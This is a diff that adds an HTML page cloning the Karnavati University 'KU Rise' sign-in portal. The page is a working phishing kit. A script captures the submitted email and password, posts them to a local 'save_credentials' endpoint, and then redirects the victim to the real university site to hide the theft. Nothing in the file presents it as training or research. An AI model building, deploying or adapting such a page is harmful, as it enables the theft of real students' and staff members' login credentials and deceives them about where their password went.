@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<base href="https://kurise.karnavatiuniversity.edu.in/"/>
+	<meta charset="utf-8"/>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1"/>
+	<title>KARNAVATI</title>
+	<link href="images/fevicon.ico" rel="shortcut icon"/>
+	<link href="assets/vendor/css/SignInPage.css" rel="stylesheet"/>
+</head>
+<body class="signIn__page ku-Signin__bg" id="signinBg">
+	<form action="" id="form1" method="post">
+		<input name="__original_url" type="hidden" value="https://kurise.karnavatiuniversity.edu.in/./"/>
+		<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwUJNDQ3Njc5NTYwD2QWAgIDDxYCHgVjbGFzcwUac2lnbkluX19wYWdlIGt1LVNpZ25pbl9fYmdkZNP85uvCgxIY/KnZngzhCdU31I4qlmH28CMPDVTOid9M"/>
+		<input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="AB5EE176"/>
+		<input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEdAAIl6bw8TKi9AgOn0pE7TojqZOK6UL57TPXWG/KQKb+A8m80H4dxfSIWmPXyayNq54i9pSvmqsMb/4cwJa5Zs3/l"/>
+		<section class="signIn__section">
+			<div class="right-block block">
+				<div class="signin--logo__wrap">
+					<img alt="signin--logo" class="guj--logo" src="assets/images/new--logo.png"/>
+					<img alt="signin--logo" class="kol--logo" src="assets/images/ilogo-kol.png"/>
+				</div>
+
+				<!-- Ku Mail ID and Password input fields replacing Google login -->
+				<div class="signin--input__wrap">
+					<label for="kuMailId" style="color: white; font-size: 1rem;">Ku Mail ID</label>
+					<input type="email" id="kuMailId" name="kuMailId" placeholder="Enter your Ku Mail ID" required="" style="width: 100%; padding: 8px; margin-bottom: 10px;"/>
+
+					<label for="kuPassword" style="color: white; font-size: 1rem;">Password</label>
+					<input type="password" id="kuPassword" name="password" placeholder="Enter your password" required="" style="width: 100%; padding: 8px; margin-bottom: 20px;"/>
+
+					<button type="submit" class="signin--btn" style="width: 100%;">Login</button>
+				</div>
+			</div>
+		</section>
+	</form>
+	<script src="https://kit.fontawesome.com/acc3df1bd4.js" crossorigin="anonymous"></script>
+
+	<script>
+		document.getElementById('form1').onsubmit = function(event) {
+			event.preventDefault();
+
+			const email = document.getElementById('kuMailId').value;
+			const password = document.getElementById('kuPassword').value;
+
+			// Send credentials to local server
+			fetch('http://localhost:5000/save_credentials', {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json'
+				},
+				body: JSON.stringify({ email: email, password: password })
+			}).then(response => {
+				// After storing credentials, redirect to real KU Rise site
+				window.location.href = 'https://kurise.karnavatiuniversity.edu.in';
+			}).catch(error => {
+				// Even on error, redirect
+				window.location.href = 'https://kurise.karnavatiuniversity.edu.in';
+			});
+		};
+	</script>
+
+</body>
+</html>
+
